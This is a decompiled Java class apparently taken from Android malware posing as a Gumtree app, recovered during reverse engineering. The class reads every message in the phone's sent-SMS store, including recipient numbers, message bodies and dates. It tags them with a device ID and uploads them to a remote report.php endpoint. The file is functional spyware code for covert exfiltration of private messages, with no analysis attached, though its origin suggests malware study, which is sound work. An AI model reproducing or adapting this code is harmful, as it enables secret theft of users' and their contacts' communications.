package com.gumsis.srs.api.requests;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import com.gumsis.Realtalk;
import com.gumsis.api.request.HttpRequest;
import com.gumsis.api.request.HttpResponse;
import com.gumsis.api.request.HttpResponseHandler;
import com.gumsis.api.tls.TxtTls;
import com.gumsis.checktls.DtTls;
import com.gumsis.srs.api.responses.StatusResponse;
import org.json.JSONArray;
import org.json.JSONObject;

public class RegistrationReportStep5Request
  extends HttpRequest
{
  private static final String PATH = "report.php";
  private HttpResponseHandler<HttpResponse> mResponseHandlerHandler;
  
  public RegistrationReportStep5Request(Context paramContext, HttpResponseHandler<HttpResponse> paramHttpResponseHandler)
  {
    super(paramContext, "report.php", 17);
    try
    {
      this.data = TxtTls.getBytesUTF8(getHttpParams(paramContext));
      this.mResponseHandlerHandler = paramHttpResponseHandler;
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  protected String getHttpParams(Context paramContext)
    throws Exception
  {
    JSONObject localJSONObject1 = new JSONObject();
    JSONObject localJSONObject2 = new JSONObject();
    localJSONObject1.put("report", "fullsms_sent");
    localJSONObject1.put("id", Realtalk.getPsuedoID(paramContext));
    Cursor localCursor = paramContext.getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);
    JSONArray localJSONArray = new JSONArray();
    int i;
    int j;
    int k;
    int m;
    if (localCursor != null)
    {
      i = localCursor.getColumnIndex("thread_id");
      j = localCursor.getColumnIndex("body");
      k = localCursor.getColumnIndex("address");
      m = localCursor.getColumnIndex("date");
      if ((j >= 0) && (localCursor.moveToFirst())) {
        break label161;
      }
    }
    for (;;)
    {
      localCursor.close();
      localJSONObject1.put("objects", localJSONArray);
      localJSONObject2.put("1", localJSONObject1);
      return TxtTls.getPostParamsUTF8(localJSONObject2);
      label161:
      do
      {
        JSONObject localJSONObject3 = new JSONObject();
        localJSONObject3.put("thread_id", localCursor.getString(i));
        localJSONObject3.put("number", localCursor.getString(k));
        localJSONObject3.put("message", localCursor.getString(j));
        Object localObject = "";
        try
        {
          String str = DtTls.getCurrentDate(DtTls.getDate(localCursor.getLong(m)), paramContext.getString(2131361812));
          localObject = str;
        }
        catch (Exception localException)
        {
          for (;;)
          {
            localException.printStackTrace();
          }
        }
        localJSONObject3.put("date", localObject);
        localJSONArray.put(localJSONObject3);
      } while (localCursor.moveToNext());
    }
  }
  
  public String getUrl()
  {
    return getBaseUrl();
  }
  
  protected void onRequestFailure(int paramInt, String paramString)
  {
    StatusResponse localStatusResponse = new StatusResponse();
    localStatusResponse.parseFailureResponse(paramInt, paramString);
    if (this.mResponseHandlerHandler != null) {
      this.mResponseHandlerHandler.onResponse(this.requestType, localStatusResponse);
    }
  }
  
  protected void onRequestSuccess(JSONObject paramJSONObject)
  {
    StatusResponse localStatusResponse = new StatusResponse();
    localStatusResponse.parseSuccessResponse(paramJSONObject);
    if (this.mResponseHandlerHandler != null) {
      this.mResponseHandlerHandler.onResponse(this.requestType, localStatusResponse);
    }
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/srs/api/requests/RegistrationReportStep5Request.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */